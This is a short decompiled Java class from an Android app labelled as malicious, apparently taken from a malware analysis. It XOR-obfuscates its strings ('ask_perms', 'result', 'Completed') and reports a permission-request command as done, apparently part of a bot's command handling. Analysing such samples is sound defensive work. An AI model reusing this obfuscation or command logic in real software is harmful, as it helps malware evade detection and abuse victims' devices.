package com.zjxyxnvvp.nxvxchltf.i;

import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class d {
    private static short[] $ = {9565, 9551, 9559, 9571, 9548, 9561, 9550, 9553, 9551, 4731, 4716, 4730, 4732, 4709, 4733, 1729, 1773, 1775, 1778, 1774, 1767, 1782, 1767, 1766};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a() {
        com.zjxyxnvvp.nxvxchltf.d dVar = com.zjxyxnvvp.nxvxchltf.d.e;
        p pVar = dVar.c;
        String $2 = $(0, 9, 9532);
        if (pVar.b($2) != null) {
            UIDNwaidobaWIODb.o = true;
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put($(9, 15, 4617), $(15, 24, 1666));
            } catch (JSONException e) {
                e.printStackTrace();
            }
            dVar.c.e($2, jSONObject);
        }
    }
}
